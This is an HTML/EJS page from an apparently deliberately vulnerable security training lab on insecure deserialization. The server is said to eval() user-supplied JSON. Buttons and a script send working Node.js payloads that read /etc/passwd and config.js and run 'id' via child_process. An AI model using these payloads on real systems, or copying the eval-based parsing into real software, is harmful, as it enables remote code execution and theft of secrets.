<div class="container" style="padding:40px 0;">
  <div style="max-width:600px;margin:0 auto;">
    <div class="section-title">
      <h2>📦 Insecure Deserialization Lab</h2>
      <p class="subtitle">A08: Remote Code Execution via eval()</p>
      <div class="accent-line"></div>
    </div>

    <div class="alert alert-warning">
      🎯 <strong>Insecure Deserialization Lab:</strong> The server uses <code>eval()</code> to deserialize JSON data. Try sending a payload that executes system commands!
    </div>

    <% if (error) { %>
      <div class="alert alert-danger">⚠️ <%= error %></div>
    <% } %>

    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">Deserialize Data</h3>
      <div class="form-group">
        <label class="form-label">JSON Data</label>
        <textarea id="deserialize-input" class="form-textarea" rows="6" style="font-family:'JetBrains Mono',monospace;font-size:0.85rem;">{"name":"Tony","suit":"Mark LXXXV","power":9001}</textarea>
      </div>
      <button onclick="deserialize()" class="btn btn-primary btn-lg" style="width:100%;">⚡ Deserialize</button>
    </div>

    <div id="deserialize-result" style="display:none;"></div>

    <div class="card" style="padding:24px;">
      <h4 style="margin-bottom:12px;">💡 RCE Payload Examples</h4>
      <div style="padding:12px;background:var(--dark-2);border-radius:var(--radius-sm);margin-bottom:12px;">
        <p style="color:var(--text-dim);font-size:0.8rem;font-family:'JetBrains Mono',monospace;word-break:break-all;">
          # Read a file:<br>
          {x: require('fs').readFileSync('/etc/passwd','utf8')}<br><br>
          # Execute a command:<br>
          {x: require('child_process').execSync('id').toString()}<br><br>
          # Read config:<br>
          {x: require('fs').readFileSync('config.js','utf8')}
        </p>
      </div>
      <button onclick="sendPayload('fs')" class="btn btn-sm btn-secondary">📁 Test Read /etc/passwd</button>
      <button onclick="sendPayload('exec')" class="btn btn-sm btn-secondary" style="margin-left:8px;">💻 Test Command: id</button>
      <button onclick="sendPayload('config')" class="btn btn-sm btn-secondary" style="margin-left:8px;">⚙️ Read config.js</button>
    </div>
  </div>
</div>

<script>
async function deserialize() {
  const rawInput = document.getElementById('deserialize-input').value.trim();
  if (!rawInput) return;
  const res = await fetch('/api/deserialize?raw=' + encodeURIComponent(rawInput), { method: 'POST' });
  const result = await res.json();
  const el = document.getElementById('deserialize-result');
  el.style.display = 'block';
  if (result.deserialized) {
    el.innerHTML = `<div class="card" style="padding:24px;border-color:var(--success);">
      <h4 style="margin-bottom:12px;color:var(--success);">✅ Deserialized Successfully</h4>
      <pre style="background:var(--dark-2);padding:12px;border-radius:4px;overflow-x:auto;">${JSON.stringify(result.deserialized, null, 2)}</pre>
      <p style="color:var(--warning);font-size:0.85rem;margin-top:10px;">⚠️ ${result.note || ''}</p>
    </div>`;
  } else {
    el.innerHTML = `<div class="card" style="padding:24px;border-color:var(--danger);">
      <h4 style="color:var(--danger);margin-bottom:12px;">❌ ${result.error}</h4>
      <p style="color:var(--text-muted);font-size:0.85rem;">${result.hint || ''}</p>
    </div>`;
  }
}

async function sendPayload(type) {
  const payloads = {
    fs: "{r: require('fs').readFileSync('/etc/passwd','utf8')}",
    exec: "{r: require('child_process').execSync('id').toString()}",
    config: "{r: require('fs').readFileSync('config.js','utf8')}"
  };
  document.getElementById('deserialize-input').value = payloads[type];
  await deserialize();
}
</script>
